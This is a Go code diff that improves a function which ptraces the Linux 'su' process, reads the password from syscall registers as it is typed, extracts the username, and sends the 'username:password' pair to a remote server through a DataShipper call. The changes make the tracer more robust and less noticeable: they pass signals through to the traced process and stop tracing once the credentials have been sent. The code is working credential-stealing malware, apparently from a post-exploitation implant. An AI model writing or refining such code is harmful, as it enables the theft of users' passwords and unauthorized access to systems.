@@ -35,11 +35,12 @@ func traceSUProcess(ctx context.Context, serverUrl string, taskData map[string]i
 		if ctx.Err() != nil {
 			return
 		}
-		if wstatus.Exited() {
+		if wstatus.Exited() || wstatus.Signaled() {
 			return
 		}
 
-		if wstatus.StopSignal() == syscall.SIGTRAP {
+		var sigToDeliver int
+		if wstatus.Stopped() && wstatus.StopSignal() == syscall.SIGTRAP {
 			inSyscall = !inSyscall
 
 			var regs syscall.PtraceRegs
@@ -63,13 +64,16 @@ func traceSUProcess(ctx context.Context, serverUrl string, taskData map[string]i
 						if IsValidPassword(password) {
 							username := extractSUUsername(pid)
 							go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
+							return
 						}
 					}
 				}
 			}
+		} else if wstatus.Stopped() {
+			sigToDeliver = int(wstatus.StopSignal())
 		}
 
-		if err := syscall.PtraceSyscall(pid, 0); err != nil {
+		if err := syscall.PtraceSyscall(pid, sigToDeliver); err != nil {
 			return
 		}
 	}
